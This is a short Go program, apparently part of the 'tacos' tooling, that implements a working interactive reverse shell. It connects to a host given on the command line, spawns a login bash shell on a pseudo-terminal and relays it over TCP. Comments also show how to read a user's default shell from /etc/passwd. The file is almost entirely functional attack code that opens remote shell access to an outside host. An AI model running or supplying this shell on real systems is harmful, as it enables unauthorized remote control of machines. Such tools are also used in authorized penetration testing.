package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/ariary/tacos/pkg/tacos"
	"github.com/creack/pty"
	"golang.org/x/term"
)

//https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e?permalink_comment_id=3425797#gistcomment-3425797
// and https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e?permalink_comment_id=3425797#gistcomment-3425797
func main() {
	//Determine default shell
	//macOS
	//dscl . -read ~/ UserShell
	//linux
	//grep ^$(id -un): /etc/passwd | cut -d : -f 7-
	tacos.DefaultShell()
	remote := os.Args[1]
	fmt.Println(remote)
	ReverseShell(remote)
}

func ReverseShell(host string) {
	conn, err := net.Dial("tcp", host)
	if nil != err {
		log.Fatal(err)
	}

	cmd := exec.Command("/bin/bash", "-li")

	// Start the command with a pty.
	ptmx, err := pty.Start(cmd)
	if err != nil {
		log.Fatal(err)
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH                        // Initial resize.
	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.

	// Set stdin in raw mode.
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	// Copy stdin to the pty and the pty to stdout.
	// NOTE: The goroutine will keep reading until the next keystroke before returning.
	go func() { _, _ = io.Copy(ptmx, conn) }()
	_, _ = io.Copy(conn, ptmx)

	//cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	// err = cmd.Run()
	// if err != nil {
	// 	fmt.Println(err)
	// }

	conn.Close()
}
